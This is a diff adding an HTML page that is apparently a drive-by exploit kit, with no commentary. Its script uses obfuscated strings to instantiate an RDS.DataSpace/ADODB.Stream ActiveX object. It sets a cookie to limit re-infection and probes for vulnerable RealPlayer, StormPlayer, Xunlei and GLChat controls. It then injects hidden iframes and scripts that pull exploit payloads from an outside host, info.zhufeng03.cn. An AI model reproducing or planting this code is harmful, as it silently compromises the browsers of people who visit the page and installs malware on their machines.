@@ -1,0 +1,51 @@
+/*
+*/
+<Html>
+<Body>
+<noscript>
+<iframe src=*></iframe>
+</noscript>
+<script language="javaScript">
+function init(){document.write();}
+window.onload = init;
+if(document.cookie.indexOf('Cuteqqsx')==-1){
+var ids="clsid:BD9";
+var idss="6C556-65A3-11D";
+var idsss="0-983A-00C04FC29E36";
+var idx=ids+idss+idsss;
+try{
+var e;
+var ado=(document["createElement"]("object"));
+ado["setAttribute"]("classid",idx);
+var as=ado["createobject"]("A"+"d"+"o"+"d"+"b."+"S"+"t"+"r"+"e"+"a"+"m","")}
+catch(e){};
+finally{
+var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+document.cookie='Cuteqqsx=qq784378237s;path=/;expires='+expires.toGMTString();
+if(e!="[object Error]"){
+document.write("<script src=http://info.zhufeng03.cn/Ajax.gif><\/script>")
+document.write("<iframe width='0' height='0' src='http://info.zhufeng03.cn/07004.html'></iframe>")}}
+else{
+try{var r;var reals=new window["ActiveXObject"]("IERPCtl.IERPCtl.1");}
+catch(r){};
+finally{if(r!="[object Error]"){
+document.write("<script src=http://info.zhufeng03.cn/logo.jpg><\/script>")}}
+try{var g;var storm=new window["ActiveXObject"]("MPS.StormPlayer");}
+catch(g){};
+finally{if(g!="[object Error]"){
+document.write("<iframe width='0' height='0' src='http://info.zhufeng03.cn/bf.html'><\/script>")}}
+try{var i;var thunder=new window["ActiveXObject"]("DPClient.Vod");}
+catch(i){};
+finally{if(i!="[object Error]"){
+document.write("<script src=http://info.zhufeng03.cn/ms06067.js><\/script>")}}
+try{var j;var lianzhong=new ActiveXObject("GLCH"+"AT.GLCha"+"tCtrl.1");}
+catch(j){};
+finally{if(j!="[object Error]"){
+document.write("<script src=><\/script>")}
+if(r=="[object Error]"&&g=="[object Error]"&&i=="[object Error]"&&j=="[object Error]"){
+document.write("<iframe width='0' height='0' src='http://info.zhufeng03.cn/QVod.html'></iframe>")}}
+}}}
+</script>
+</Body>
+</Html>
